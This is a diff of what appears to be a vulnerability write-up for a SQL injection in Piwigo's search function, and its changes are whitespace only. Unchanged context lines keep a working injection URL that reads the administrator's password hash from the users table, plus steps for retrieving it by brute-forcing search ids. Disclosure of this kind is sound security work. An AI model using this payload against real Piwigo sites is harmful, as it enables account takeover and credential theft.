@@ -12,7 +12,8 @@ An attacker can use the function of search to insert some sql injection payload 
 Request `http://127.0.0.1/qsearch.php?q[test'),((select concat("a:1:{s:1:\"q\";s:41:\"password:",(select mid(password,1,32) from piwigo_users where id%3d1),"\";}")))%23]=1`
 
 And then it will be redirected to `http://127.0.0.1/index.php?/search/${id}`
-Record the value of the id.
+
+ Record the value of the id.
 
 
 
@@ -30,5 +31,7 @@ When an administrator open the URL above,a piece of data that contains the passw
 
 
 Then we can request `http://172.20.10.8/index.php?/search/${id}` to  retrieve the password of the administrator.
+ 
 ![2](21.png)
+ 
 Because the id is incremental,we can just bruteforce it.
